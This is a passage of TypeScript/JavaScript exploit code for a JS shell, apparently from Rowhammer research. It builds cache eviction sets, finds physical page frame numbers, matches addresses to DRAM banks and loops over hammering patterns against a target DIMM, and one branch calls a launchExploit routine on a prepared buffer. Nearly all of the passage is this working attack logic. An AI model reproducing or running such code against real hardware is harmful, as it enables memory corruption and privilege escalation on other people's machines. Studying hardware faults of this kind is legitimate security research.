     * buf9[3] = i % allocsPerBlock;
     * buf9[0] = Math.floor(i / allocsPerBlock);
     */
    bufPlaza.push(buf9);
    bufPlaza32.push(new Uint32Array(buf9.buffer));
  }

  if (release) {
    print("Will now try to release the last page of the last buf...");
    sleep(20);

    let tmp = bufPlaza.length;

    for (let i = 0; i < 252; i++) {
      bufPlaza.pop();
      // bufPlaza = bufPlaza.splice(bufPlaza.length - 1, 1);
      // bufPlaza.splice(bufPlaza.length - 1, 1);
      break;
    }

    buf9 = null;
    gc();
  }

  buf9 = null;

  print("Time to build the first eviction set... (ignoring slabIdx)");

  let slabIdx = 0; /* Had: parseInt(readline()) */

  sleep(10); /* Waiting for maps.py to complete, if rushing */

  if (PRETEND) {
    // print("Buffer index?");
    // idx = slab * bufPlaza32 + parseInt(readline());
    let targetIdx: number = -1;
    let targetPFN: number = -1;

    for (let i = bufPlaza.length - bufsPerSlab; i >= 0; i -= bufsPerSlab) {
      let slab = i / bufsPerSlab;
      let actualBoundary = bufPlaza[i][1];

      /* Only available when rushing */
      let pfn =
        bufPlaza[i][2] ^
        (bufPlaza[i][3] << 8) ^
        (bufPlaza[i][4] << 16) ^
        (bufPlaza[i][5] << 24);

      if (actualBoundary) assert(pfn);

      if (actualBoundary) {
        targetIdx = i + 2;
        targetPFN = pfn;
        print(
          "targetIdx",
          targetIdx,
          actualBoundary,
          "PFN: 0x" + pfn.toString(16),
        );

        // print("length pre", bufPlaza[targetIdx].length);
        // bufPlaza[targetIdx].splice(1 * 4 * kb, 13 * 4 * kb);
        // bufPlaza[targetIdx].buffer.resize(4 * kb);
        // print("length post", bufPlaza[targetIdx].length);

        for (let j = 0; j < bufPlaza[targetIdx].length; j++) {
          bufPlaza[targetIdx][j] = 0xcc;
        }

        break;
      }
    }

    assert(targetIdx >= 0);

    let targetIdxs: number[] = [];
    const SMALLER_NUM_BUFS = 1;

    for (let k = 0; k < SMALLER_NUM_BUFS; k++) {
      targetIdxs.push(targetIdx + k);
    }

    const spec = {
      pretend: PRETEND,
      zeroOneMask: 1 << getRandomInt(3, 16),
    };

    launchExploit(null, spec, targetIdxs, bufPlaza32, targetPFN);
  }

  print("Buffer index?");
  let bufIdx = exhaustFirst - 1;

  buf8 = bufParking[bufIdx];

  const bufSizeInPages = 512 * 512;
  const baseInPages = 256;

  let offsetSums: number[] = new Array(256).fill(0);
  let boundaries: number[] = [];
  let jumpBy: number = 1;
  let sum: number = -1;

  console.log("[>] Looking for first eviction set... ");

  let evictionSet = new EvictionSet(llcInfo.wayness);
  let triesSinceBoundaryGuess = 0;

  /* Sometimes the first MB is a mess */
  for (
    let shiftInPages = baseInPages;
    shiftInPages < bufSizeInPages;
    shiftInPages++
  ) {
    let skip: boolean = true;

    if (!boundaries.length) {
      skip = false;
    } else {
      for (const b of boundaries) {
        if (shiftInPages % 256 === b) skip = false;
      }
    }

    if (skip) continue;

    if (boundaries.length) {
      triesSinceBoundaryGuess++;
      if (triesSinceBoundaryGuess >= 8) {
        print("wrong boundary guess? aborting...");
        assert(0);
      }
    }

    const availableHugePages: number = Math.floor(
      (bufSizeInPages - shiftInPages) / 512,
    );

    /*
     * Mapping huge pages indices to normal page indices, takes into account the
     * offset at which the first huge page starts!
     *
     * Assuming everything starting and above shift is contiguous
     */
    let hugePageAtPages = Array.from({ length: availableHugePages }, (_, i) => {
      return shiftInPages + i * 512;
    });

    print(shiftInPages, shiftInPages / 256);

    sum = buildEvictionSet(
      evictionSet,
      hugePageAtPages,
      llcInfo,
      boundaries.length == 0,
    );

    offsetSums[shiftInPages % offsetSums.length] += sum;

    if (sum === 0) {
      reportTime("First eviction set found.");

      /* Or should this be % 256? No, right? */
      print("Boundary at ", shiftInPages % 512, shiftInPages);

      evictionSet.boundary = shiftInPages % 512;

      printAddresses(
        evictionSet.addrs,
        "Eviction Set",
        true,
        hugePageAtPages,
        bankStats,
        llcInfo,
      );

      break;
      /*
       * We start at the first MB, if we are +3 MB... Sort all the timings.
       * Guess boundary based on spikes
       */
    } else if (shiftInPages === baseInPages + 3 * 256) {
      offsetSums[0] = -1; /* Special case, exclude */
      const sorted = [...offsetSums].sort((a, b) => b - a);

      /* We take the top five: one of those is almost always the boundary */
      for (const b of sorted.slice(0, 3)) {
        boundaries.push(offsetSums.indexOf(b));
      }

      assert(boundaries[0] != boundaries[1]);

      for (const i in offsetSums) {
        print(i, offsetSums[i]);
      }

      boundaries.sort();

      print(boundaries);
    }
  }

  if (sum != 0) throw new Error("Could not find an eviction set!");

  rotateEvictionSet(evictionSet, llcInfo);

  for (let c: number = 0; c < evictionSet.colors.length; c++) {
    evictionSet.setColor(c);
    print(c, evictionSet.addrs);
  }

  console.log("[>] Time to color...");
  sleep(5);

  let matches = sliceMatcherMB(
    evictionSet,
    bufPlaza,
    slabIdx,
    bankStats,
    llcInfo,
  );

  reportTime(`Colored some slabs`);

  let sliceIterator = makeSliceIterator(llcInfo);
  let setBuildAttempts = 0;

  while (true) {
    const pairs: EvictionSet[] = getSetPairsMB(
      2,
      matches,
      bufPlaza,
      bankStats,
      llcInfo,
      evictionSet,
    );

    if (pairs.length !== 2) {
      setBuildAttempts++;

      if (setBuildAttempts >= 16) {
        print(
          "cannot find enough addresses that map to the same bank. aborting...",
        );
        assert(0);
      }

      continue;
    } else {
      setBuildAttempts = 0;
    }

    let doubleSpaceIterator = makeDoubleSpaceIterator(
      [2, 3, 5],
      [1, 2, 4],
      // [0x1, 0x101, 0x841], /* original */
      // [0x1, 0x101], /* a10 */
      [0x101, 0x841] /* a2 */,

      // [0x841, 0x1111, 0x2491], /* original */
      // [0x841], /* a10 */
      [0x2491] /* a2 */,
      [
        [1, 1],
        [1, 2],
        [2, 1],
        [2, 2],
        [2, 3],
        [0, 0],
        [0, 3],
        [3, 0],
        [3, 3],
      ],
      // [9, 17, 33], /* original */
      [9, 17],
    );

    while (false) {
      /* disabled for speed */
      let pi = doubleSpaceIterator.next();
      if (pi.done) break;
      setsToDoubleMB(
        pairs,
        pi.value.ratio,
        pi.value.expansion,
        [pi.value.assemblyX, pi.value.assemblyY],
        pi.value.nonUniformities,
        pi.value.tREFIs,
        bufPlaza32,
        bankStats,
        llcInfo,
        matches,
      );
    }

    let hspaceIterator = makeHSpaceIterator(
      [13, 11, 9, 7, 5, 3, 2, 1],
      // [0x2929, 0x2491, 0x1111, 0x841, 0x101], /* original */
      [0x2929] /* a2/a10 */,
      [3, 2, 1],
    );

    while (true) {
      let pi = hspaceIterator.next();
      if (pi.done) break;

      for (const dp of __DATA_PATTERNS) {
        DATA_PATTERN = dp;
        setsToHMB(
          pairs[0],
          pi.value.assembly,
          pi.value.tREFIs,
          pi.value.nonUniformity,
          bufPlaza32,
          bankStats,
          llcInfo,
          matches,
        );
      }
    }

    print("changing eviction sets");
  }

  assert(0);
}

/* The only argument for now: the DIMM you're targeting */
assert(scriptArgs.length == 1);

let dimm = scriptArgs[0];

main(dimm);
